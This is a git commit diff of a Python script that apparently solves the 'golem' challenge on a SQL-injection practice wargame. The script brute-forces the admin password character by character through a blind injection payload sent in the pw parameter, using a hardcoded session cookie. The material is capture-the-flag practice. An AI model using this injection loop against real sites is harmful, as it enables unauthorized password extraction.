6a6075570dab43f687d32ee8b6dcac84c2d3237d
nacong <nabinyang37@gmail.com>
2021-03-25 12:49:32 +0900

    golem

--- golem.py
+++ golem.py
@@ -7,12 +7,11 @@ password=""
 for j in range(1,9): 
     for i in range(48,128):
         try:
-            url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=%27%20||%20right(left(pw," + str(j) + "),1)" +"%20like%20char("+ str(i) +")%23"
+            url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=%27%20|| id like 'admin' %26%26 %20right(left(pw," + str(j) + "),1)" +"%20like%20char("+ str(i) +")%23" # mid(pw,j,1) 도 됨.
             r = requests.post(url,cookies=(dict(PHPSESSID="t3lssqi3a9enhffi1mac5amc65")))
-            print(url)
         except:
             print("Error")
-        continue
+            continue
         if 'Hello admin' in r.text: 
             password = password + chr(i)
             print ("[+] PW " + str(j) + " : " + password)
